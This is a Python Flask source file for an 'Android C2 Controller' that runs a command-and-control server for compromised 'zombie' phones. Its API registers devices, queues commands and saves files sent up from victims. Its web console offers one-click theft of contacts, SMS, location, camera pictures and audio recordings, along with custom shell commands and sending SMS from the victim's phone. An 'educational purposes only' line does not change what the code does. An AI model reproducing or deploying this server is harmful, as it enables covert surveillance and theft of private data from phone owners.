#!/usr/bin/env python3
"""
ANDROID C2 CONTROLLER
Server for controlling Android zombie devices
Educational purposes only
"""

import os
import sys
import json
import time
import threading
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'android-c2-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*")

# Store Android devices
android_devices = {}
device_commands = {}
device_results = {}

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

BANNER = f"""
{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗     ║
║   ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ║
║   ███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║    ║
║   ██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║    ║
║   ██║  ██║██║ ╚████║██████╔╝██████╔╝╚██████╔╝██║██████╔╝    ║
║   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝╚═════╝     ║
║                                                              ║
║               ANDROID C2 CONTROLLER v2.0                     ║
║               Remote Device Management                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}
"""

# Android-specific routes
@app.route('/api/android/register', methods=['POST'])
def android_register():
    """Register new Android device"""
    data = request.json
    device_id = data.get('device_id')
    
    if not device_id:
        return jsonify({'success': False, 'error': 'Device ID required'})
    
    android_devices[device_id] = {
        'device_id': device_id,
        'model': data.get('model', 'Unknown'),
        'brand': data.get('brand', 'Unknown'),
        'android_version': data.get('android_version', 'Unknown'),
        'sdk_version': data.get('sdk_version', 0),
        'manufacturer': data.get('manufacturer', 'Unknown'),
        'registered_at': datetime.now().isoformat(),
        'last_seen': datetime.now().isoformat(),
        'status': 'online',
        'capabilities': data.get('capabilities', {}),
        'battery': 0,
        'network': 'unknown',
        'location': None,
        'rooted': data.get('rooted', False)
    }
    
    device_commands[device_id] = []
    device_results[device_id] = []
    
    print(f"{Colors.GREEN}[+] Android device registered:{Colors.ENDC}")
    print(f"    Device ID: {Colors.CYAN}{device_id}{Colors.ENDC}")
    print(f"    Model: {data.get('model')} ({data.get('android_version')})")
    print(f"    Brand: {data.get('brand')}")
    print(f"    Rooted: {data.get('rooted', False)}")
    print(f"    Capabilities: {json.dumps(data.get('capabilities', {}))}")
    
    # Notify web clients
    socketio.emit('android_connected', android_devices[device_id])
    
    return jsonify({'success': True, 'message': 'Device registered'})

@app.route('/api/android/heartbeat', methods=['POST'])
def android_heartbeat():
    """Handle Android device heartbeat"""
    data = request.json
    device_id = data.get('device_id')
    
    if device_id in android_devices:
        android_devices[device_id]['last_seen'] = datetime.now().isoformat()
        android_devices[device_id]['status'] = 'online'
        
        # Update device info
        if 'battery' in data:
            android_devices[device_id]['battery'] = data['battery']
        if 'network' in data:
            android_devices[device_id]['network'] = data['network']
        if 'location' in data:
            android_devices[device_id]['location'] = data['location']
        
        # Notify web clients
        socketio.emit('android_heartbeat', {
            'device_id': device_id,
            'battery': data.get('battery'),
            'timestamp': data.get('timestamp')
        })
    
    return jsonify({'success': True})

@app.route('/api/android/commands')
def get_android_commands():
    """Get pending commands for Android device"""
    device_id = request.args.get('device_id')
    
    if device_id in device_commands:
        commands = device_commands[device_id].copy()
        device_commands[device_id] = []  # Clear after sending
        return jsonify({'commands': commands})
    
    return jsonify({'commands': []})

@app.route('/api/android/result', methods=['POST'])
def android_command_result():
    """Handle command result from Android device"""
    data = request.json
    device_id = data.get('device_id')
    command_id = data.get('command_id')
    
    result_entry = {
        'device_id': device_id,
        'command_id': command_id,
        'command': data.get('command'),
        'result': data.get('result'),
        'timestamp': datetime.now().isoformat()
    }
    
    if device_id in device_results:
        device_results[device_id].append(result_entry)
    
    print(f"{Colors.CYAN}[*] Result from Android {device_id}:{Colors.ENDC}")
    print(f"    Command: {data.get('command')}")
    print(f"    Result: {data.get('result')[:100]}...")
    
    # Notify web clients
    socketio.emit('android_result', result_entry)
    
    return jsonify({'success': True})

@app.route('/api/android/command', methods=['POST'])
def send_android_command():
    """Send command to Android device"""
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    if not device_id or not command:
        return jsonify({'success': False, 'error': 'Device ID and command required'})
    
    if device_id not in android_devices:
        return jsonify({'success': False, 'error': 'Device not registered'})
    
    command_id = str(uuid.uuid4())
    cmd_entry = {
        'id': command_id,
        'command': command,
        'timestamp': datetime.now().isoformat()
    }
    
    if device_id not in device_commands:
        device_commands[device_id] = []
    
    device_commands[device_id].append(cmd_entry)
    
    print(f"{Colors.YELLOW}[*] Command sent to Android {device_id}:{Colors.ENDC}")
    print(f"    Command: {command}")
    
    return jsonify({'success': True, 'command_id': command_id})

@app.route('/api/android/devices')
def get_android_devices():
    """Get all registered Android devices"""
    return jsonify(list(android_devices.values()))

@app.route('/api/android/device/<device_id>')
def get_android_device(device_id):
    """Get specific Android device info"""
    if device_id in android_devices:
        return jsonify(android_devices[device_id])
    return jsonify({'error': 'Device not found'}), 404

@app.route('/api/android/device/<device_id>/results')
def get_android_results(device_id):
    """Get command results for device"""
    if device_id in device_results:
        return jsonify(device_results[device_id])
    return jsonify([])

@app.route('/api/android/send_file', methods=['POST'])
def send_file_to_device():
    """Send file to Android device"""
    data = request.json
    device_id = data.get('device_id')
    filename = data.get('filename')
    file_data = data.get('data')  # base64 encoded
    
    if not all([device_id, filename, file_data]):
        return jsonify({'success': False, 'error': 'Missing parameters'})
    
    # Store file for device to download
    if device_id not in device_commands:
        device_commands[device_id] = []
    
    command_id = str(uuid.uuid4())
    cmd_entry = {
        'id': command_id,
        'command': f'download:{filename}',
        'file_data': file_data,
        'timestamp': datetime.now().isoformat()
    }
    
    device_commands[device_id].append(cmd_entry)
    
    return jsonify({'success': True, 'command_id': command_id})

@app.route('/api/android/download_file', methods=['POST'])
def download_from_device():
    """Handle file upload from Android device"""
    data = request.json
    device_id = data.get('device_id')
    filename = data.get('filename')
    file_data = data.get('data')  # base64 encoded
    
    # Save file
    try:
        os.makedirs('downloads', exist_ok=True)
        file_path = f"downloads/{device_id}_{filename}"
        
        with open(file_path, 'wb') as f:
            f.write(base64.b64decode(file_data))
        
        print(f"{Colors.GREEN}[+] File received from {device_id}:{Colors.ENDC}")
        print(f"    File: {filename}")
        print(f"    Saved to: {file_path}")
        
        return jsonify({'success': True, 'path': file_path})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Android Console Interface
@app.route('/android_console')
def android_console():
    """Android device console interface"""
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Android C2 Console</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .devices-panel, .command-panel, .output-panel {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #00ff00;
            margin-bottom: 20px;
        }
        .device-card {
            background: #0d1117;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid #00ff00;
            cursor: pointer;
        }
        .device-card.selected {
            border-left-color: #00ffff;
            background: #0a0d14;
        }
        .command-input {
            width: 100%;
            padding: 10px;
            background: #0d1117;
            border: 2px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            margin: 10px 0;
        }
        button {
            padding: 10px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        .output {
            max-height: 400px;
            overflow-y: auto;
            padding: 10px;
            background: #0d1117;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>📱 Android C2 Console</h1>
        <p>Control Android Zombie Devices</p>
    </div>
    
    <div class="devices-panel">
        <h2>📱 Connected Devices</h2>
        <div id="devices-list"></div>
    </div>
    
    <div class="command-panel">
        <h2>💻 Command Center</h2>
        <select id="command-select" class="command-input">
            <option value="">Select a command...</option>
            <option value="get_info">Get Device Info</option>
            <option value="shell:ls /sdcard">List Files</option>
            <option value="get_contacts">Get Contacts</option>
            <option value="get_sms">Get SMS</option>
            <option value="get_location">Get Location</option>
            <option value="take_picture">Take Picture</option>
            <option value="record_audio">Record Audio (10s)</option>
            <option value="get_apps">Get Installed Apps</option>
        </select>
        <input type="text" id="custom-command" class="command-input" placeholder="Or enter custom command...">
        <div>
            <button onclick="sendCommand()">Send Command</button>
            <button onclick="sendSMS()">Send SMS</button>
            <button onclick="takeScreenshot()">Take Screenshot</button>
            <button onclick="recordAudio()">Record Audio</button>
        </div>
    </div>
    
    <div class="output-panel">
        <h2>📊 Command Output</h2>
        <div id="output" class="output"></div>
    </div>
    
    <script>
        let selectedDevice = null;
        let devices = {};
        
        // Load devices
        function loadDevices() {
            fetch('/api/android/devices')
                .then(r => r.json())
                .then(data => {
                    devices = {};
                    data.forEach(d => devices[d.device_id] = d);
                    updateDevicesList();
                });
        }
        
        // Update devices list
        function updateDevicesList() {
            const container = document.getElementById('devices-list');
            container.innerHTML = '';
            
            Object.values(devices).forEach(device => {
                const card = document.createElement('div');
                card.className = 'device-card';
                if (selectedDevice === device.device_id) {
                    card.classList.add('selected');
                }
                card.onclick = () => {
                    selectedDevice = device.device_id;
                    updateDevicesList();
                    addOutput(`Selected device: ${device.model} (${device.device_id})`);
                };
                
                card.innerHTML = `
                    <strong>${device.model}</strong> (${device.brand})<br>
                    <small>ID: ${device.device_id}</small><br>
                    <small>Android ${device.android_version} • Battery: ${device.battery || '?'}%</small><br>
                    <small>Rooted: ${device.rooted ? 'Yes' : 'No'} • Last seen: ${new Date(device.last_seen).toLocaleTimeString()}</small>
                `;
                
                container.appendChild(card);
            });
        }
        
        // Send command
        function sendCommand() {
            if (!selectedDevice) {
                addOutput('❌ Please select a device first');
                return;
            }
            
            const select = document.getElementById('command-select');
            const custom = document.getElementById('custom-command');
            const command = select.value || custom.value;
            
            if (!command) {
                addOutput('❌ Please enter a command');
                return;
            }
            
            fetch('/api/android/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: selectedDevice,
                    command: command
                })
            })
            .then(r => r.json())
            .then(data => {
                addOutput(`✅ Command sent: ${command}`);
                custom.value = '';
                select.value = '';
            })
            .catch(err => addOutput(`❌ Error: ${err}`));
        }
        
        // Send SMS
        function sendSMS() {
            const number = prompt('Enter phone number:');
            if (!number) return;
            
            const message = prompt('Enter message:');
            if (!message) return;
            
            const command = `sms:${number},${message}`;
            document.getElementById('custom-command').value = command;
            sendCommand();
        }
        
        // Take screenshot
        function takeScreenshot() {
            document.getElementById('custom-command').value = 'take_picture';
            sendCommand();
        }
        
        // Record audio
        function recordAudio() {
            document.getElementById('custom-command').value = 'record_audio';
            sendCommand();
        }
        
        // Add output
        function addOutput(text) {
            const output = document.getElementById('output');
            const line = document.createElement('div');
            line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        // WebSocket for real-time updates
        const ws = new WebSocket(`ws://${window.location.hostname}:${window.location.port || 5000}`);
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            if (data.type === 'android_connected') {
                addOutput(`📱 New device connected: ${data.model}`);
                loadDevices();
            } else if (data.type === 'android_result') {
                addOutput(`📨 Result from ${data.device_id}:`);
                addOutput(data.result);
            }
        };
        
        // Initial load
        loadDevices();
        setInterval(loadDevices, 5000);
    </script>
</body>
</html>
    '''

def main():
    print(BANNER)
    host = '0.0.0.0'
    port = 5000
    
    print(f"{Colors.GREEN}[+] Starting Android C2 Controller{Colors.ENDC}")
    print(f"    Host: {host}")
    print(f"    Port: {port}")
    print(f"    Web Console: http://localhost:{port}/android_console")
    print(f"\n{Colors.YELLOW}[*] Waiting for Android devices to connect...{Colors.ENDC}\n")
    
    socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
